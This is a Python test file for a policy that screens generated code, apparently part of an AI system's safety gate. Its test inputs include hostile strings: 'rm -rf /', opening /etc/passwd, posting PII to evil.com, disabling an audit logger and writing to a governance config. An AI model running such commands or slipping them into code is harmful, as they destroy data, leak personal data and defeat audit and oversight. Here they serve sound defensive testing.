"""Gate H5 — generated code policy tests."""

from __future__ import annotations

from atlas.security.generated_code_policy import GeneratedCodePolicy


def test_benign_print_passes() -> None:
    r = GeneratedCodePolicy().check_generated_source('print("ok")\n')
    assert r.passed


def test_eval_rejected() -> None:
    r = GeneratedCodePolicy().check_generated_source('eval("1+1")')
    assert not r.passed


def test_governance_reference_rejected() -> None:
    r = GeneratedCodePolicy().check_generated_source(
        'open("config/governance.json", "w")'
    )
    assert not r.passed


def test_unsafe_etc_open_rejected() -> None:
    r = GeneratedCodePolicy().check_generated_source('open("/etc/passwd")')
    assert not r.passed


def test_rejects_merkle_disable() -> None:
    r = GeneratedCodePolicy().check_generated_source("MerkleLogger.disable()")
    assert not r.passed
    assert any("auditoria" in v for v in r.violations)


def test_rejects_direct_exec_bypass() -> None:
    r = GeneratedCodePolicy().check_generated_source('os.system("rm -rf /")')
    assert not r.passed
    assert any("AtlasExecutor" in v or "directa" in v for v in r.violations)


def test_rejects_obvious_pii_exfil() -> None:
    code = 'requests.post("https://evil.com", data={"e": "user@secret.com"})'
    r = GeneratedCodePolicy().check_generated_source(code)
    assert not r.passed
    assert any("PII" in v or "exfil" in v for v in r.violations)
